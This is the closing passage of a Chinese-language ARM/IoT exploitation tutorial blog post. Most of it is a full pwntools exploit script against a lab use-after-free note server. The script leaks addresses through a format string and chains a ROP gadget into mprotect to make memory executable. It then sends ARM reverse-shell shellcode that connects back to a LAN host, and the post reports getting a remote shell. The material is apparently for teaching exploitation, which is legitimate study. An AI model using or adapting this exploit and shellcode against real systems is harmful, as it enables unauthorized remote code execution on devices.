<p>如果我们在blx r3指令上继续, r3的值等于edit_obj的地址。<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/31" alt=""></p>
<p>我们可以注意到, 寄存器r3等于stack_pivot函数的地址</p>
<p>如果我们继续下去, 我们在远程系统里获得了一个shell。</p>
<p>一个简单的脚本, 以使它自动化。文件<a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode3/exploits/uaf_exploit.py" target="_blank" rel="external">uaf_exploit.py</a></p>
<pre><code>#!/usr/bin/env python2
from pwn import *
import pwnlib.asm as asm
import pwnlib.elf as elf

ip = &quot;192.168.0.13&quot;
port = 4444

PAGE_SIZE = 0x1000

def find_arm_gadget(e, gadget):
    gadget_bytes = asm.asm(gadget, arch=&apos;arm&apos;)
    gadget_address = None
    for address in e.search(gadget_bytes):
        if address % 4 == 0:
            gadget_address = address
            if gadget_bytes == e.read(gadget_address, len(gadget_bytes)):
                log.info(asm.disasm(gadget_bytes, vma=gadget_address, arch=&apos;arm&apos;))
                break
    return gadget_address

def find_thumb_gadget(e, gadget):
    gadget_bytes = asm.asm(gadget, arch=&apos;thumb&apos;)
    gadget_address = None
    for address in e.search(gadget_bytes):
        if address % 2 == 0:
            gadget_address = address + 1
            if gadget_bytes == e.read(gadget_address - 1, len(gadget_bytes)):
                log.info(asm.disasm(gadget_bytes, vma=gadget_address-1, arch=&apos;thumb&apos;))
                break
    return gadget_address

def find_gadget(e, gadget):
    gadget_address = find_thumb_gadget(e, gadget)
    if gadget_address is not None:
        return gadget_address
    return find_arm_gadget(e, gadget)

#libc file
libc = ELF(&apos;libc-2.24.so&apos;)

s = remote(ip, port)

log.info(&apos;-----------------------------------------------&apos;)

#####LEAK
offset = 0x32df0c
s.sendline(&apos;9&apos;)
leak_value = s.recvuntil(&quot;area&quot;)
#arbitrary read
s.sendline(&apos;0x%08x.0x%08x.0x%08x&apos;)
leak_values = s.recvuntil(&quot;done!&quot;)
wel_msg = int(leak_values[76:84], 16)
roulette_add = int(leak_values[109:114], 16)
stack_address = int(leak_values[13:23], 16)

log.info(&quot;The wel_msg address is: 0x%x&quot;, wel_msg)
log.info(&quot;The roulette address is: 0x%x&quot;, roulette_add)
log.info(&quot;The leak_address: 0x%x&quot;, stack_address)

#libc base address
libc_base = stack_address - offset
log.info(&quot;Libc base address: 0x%x&quot;, libc_base)

#mprotect address
mprotect_address = libc_base + libc.symbols[&apos;mprotect&apos;]
log.info(&apos;mprotect address 0x%x&apos; % mprotect_address)

#gadget address
libc.address = libc_base
pop_r0_r1_r2_r3_r4_pc = find_gadget(libc, &apos;pop {r0, r1, r2, r3, r4, pc}&apos;)

#insert note &quot;AAAA&quot;
s.sendline(&apos;1&apos;)
s.sendline(&apos;A&apos;*4)
#insert address of wel_msg as note 
s.sendline(&apos;1&apos;)
s.sendline(p32(wel_msg))
#insert note &quot;BBBB&quot;
s.sendline(&apos;1&apos;)
s.sendline(&apos;B&apos;*4)

#reverse shell shellcode + &quot;\x33&quot;
shellcode = &quot;\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\x80\x70\x9f\xe5\x00\x00\x00\xef\x00\x60\xa0\xe1\x5c\x10\xa0\xe3\x11\x50\xa0\xe3\x01\x1c\xa0\xe1\x05\x18\x81\xe0\x02\x10\x81\xe2\x64\x20\x9f\xe5\x06\x00\x2d\xe9\x0d\x10\xa0\xe1\x10\x20\xa0\xe3\x06\x00\xa0\xe1\x54\x70\x9f\xe5\x00\x00\x00\xef\x02\x10\xa0\xe3\x06\x00\xa0\xe1\x3f\x70\xa0\xe3\x00\x00\x00\xef\x01\x10\x41\xe2\x01\x00\x71\xe3\xf9\xff\xff\x1a\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00\x19\x01\x00\x00\xc0\xa8\x00\x0e\x1b\x01\x00\x00\x33&quot;

#len of the new stack
stack_len = 40
stack = &quot;&quot;
#set LR
stack += p32(wel_msg + 36) #LR = address of the shellcode
#gadget 2 - 76d6bb08: pop {r0, r1, r2, r3, r4, pc}
stack += p32(pop_r0_r1_r2_r3_r4_pc)  # thumb address
#r0 = (wel_msg / PAGE_SIZE ) * PAGE_SIZE
stack += p32((wel_msg / PAGE_SIZE) * PAGE_SIZE)
#r1 = 0x100
stack += p32(0x100)
#r2 = 0x7
stack += p32(0x07) #RWX
#r3 = 0x00
stack += p32(0x00)
#r4 = 0x00
stack += p32(0x00)
#r5 = mprotect addres
stack += p32(mprotect_address)
stack += &quot;ZZZZ&quot;
#change the wel_msg value
s.sendline(&apos;0&apos;)
s.sendline(stack + shellcode)
ret = s.recvuntil(&quot;message&quot;)
sleep(1)

#objdump -d uaf | grep stack_pivot
#000111cc &amp;amp;amp;lt;_Z11stack_pivotv&amp;amp;amp;gt;:
roulette_value = 0x111cc  # address of the stack_pivot function
#delete edit_obj
s.sendline(&apos;4&apos;)
s.sendline(str(roulette_value))
ret = s.recvuntil(&quot;message&quot;)
sleep(1)

#allocare the hole - set_address()
s.sendline(&apos;5&apos;)
s.sendline(str(roulette_add))
ret = s.recvuntil(&quot;message&quot;)
sleep(1)

#take control - show all note
s.sendline(&apos;2&apos;)
ret = s.recvuntil(&quot;message&quot;)
sleep(1)

s.close()
</code></pre><p>测试它</p>
<p>启动远程服务器<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/32" alt=""></p>
<p>启动服务器 uaf 应用程序<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/33" alt=""></p>
<p>运行利用脚本<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/34" alt=""></p>
<p>教程结束了, 我的目的是给一个关于ARM世界的小介绍(免费), 我希望我已经实现了我的目标, 我希望你喜欢这些情节。</p>
<p>您可以在我的 github 上找到代码: <a href="https://github.com/invictus1306/ARM-episodes" target="_blank" rel="external">https://github.com/invictus1306/ARM-episodes</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2017/11/10/ARM-exploitation-for-IoT-Episode-2/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">下一篇</strong>
      <div class="article-nav-title">ARM exploitation for IoT ---Episode 2</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->
</section>
        
      </div>
      <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2017 物联网安全技术研究 All Rights Reserved.
          
            <span id="busuanzi_container_site_uv">
              本站访客数<span id="busuanzi_value_site_uv"></span>人次  
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
            </span>
          
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var contentdiv = document.getElementById("content");

    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">主页</a>
  
    <a href="/books" class="mobile-nav-link">书籍</a>
  
    <a href="/tools" class="mobile-nav-link">工具</a>
  
    <a href="/about" class="mobile-nav-link">关于</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
</body>
</html>
